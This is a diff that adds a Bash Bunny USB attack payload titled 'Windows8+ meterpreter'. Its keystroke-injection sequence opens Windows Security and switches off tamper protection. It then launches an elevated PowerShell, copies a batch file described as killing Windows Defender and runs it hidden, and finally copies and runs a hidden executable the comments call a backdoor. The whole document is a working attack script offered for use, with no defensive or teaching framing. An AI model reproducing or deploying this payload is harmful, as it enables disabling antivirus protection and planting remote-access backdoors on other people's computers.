@@ -1,0 +1,95 @@
+Windows meterpreter dropper Bash Bunny payloads
+#!/bin/bash
+#
+# Title:      Windows8+ meterpreter
+# Version:    1.0
+#
+# Amber       Executing
+# Red         Failed
+# Green       Finished
+
+LED Y
+ATTACKMODE HID
+# Disable tamper protection
+Q DELAY 8000
+Q GUI
+Q DELAY 2000
+Q STRING tamper protection
+Q DELAY 3000
+Q ENTER
+Q DELAY 4000
+
+# Menu 2
+Q TAB
+Q DELAY 1000
+Q TAB
+Q DELAY 1000
+Q TAB
+Q DELAY 1000
+Q TAB
+Q DELAY 3000
+
+# Turn off tamper protection
+Q TAB
+Q DELAY 1500
+Q SHIFT TAB
+Q DELAY 1500
+Q SPACE
+Q DELAY 3000
+Q LEFT
+Q DELAY 1500
+Q ENTER
+Q DELAY 2000
+Q ALT F4
+Q DELAY 2000
+
+ATTACKMODE HID STORAGE
+# moves file that kills windows defender
+Q DELAY 7000
+Q GUI
+Q DELAY 3000
+Q STRING powershell
+Q DELAY 2000
+Q MENU
+Q DELAY 2000
+Q DOWN
+Q DELAY 2000
+Q ENTER
+Q DELAY 2000
+Q LEFT
+Q DELAY 2000
+Q LEFT
+Q DELAY 2000
+Q ENTER
+Q DELAY 2000
+# Q ALT y
+Q DELAY 3000
+Q STRING copy D:\\payloads\\switch1\\test.bat -Destination \$env:PUBLIC
+Q DELAY 2000
+Q ENTER
+Q DELAY 2000
+
+# runs file that kills windows defender
+Q STRING start \$env:PUBLIC\\test.bat -Windowstyle Hidden
+Q DELAY 2000
+Q ENTER
+Q DELAY 3000
+
+# runs backdoor
+Q STRING copy D:\\payloads\\switch1\\test.exe -Destination \$env:PUBLIC
+Q DELAY 2000
+Q ENTER
+Q DELAY 2000
+Q STRING start \$env:PUBLIC\\test.exe -Windowstyle Hidden
+Q DELAY 2000
+Q ENTER
+Q DELAY 3000
+Q ALT F4
+# Q DELAY 2000
+
+# sync filesystem
+sync
+
+# Green LED for finished
+LED G
+
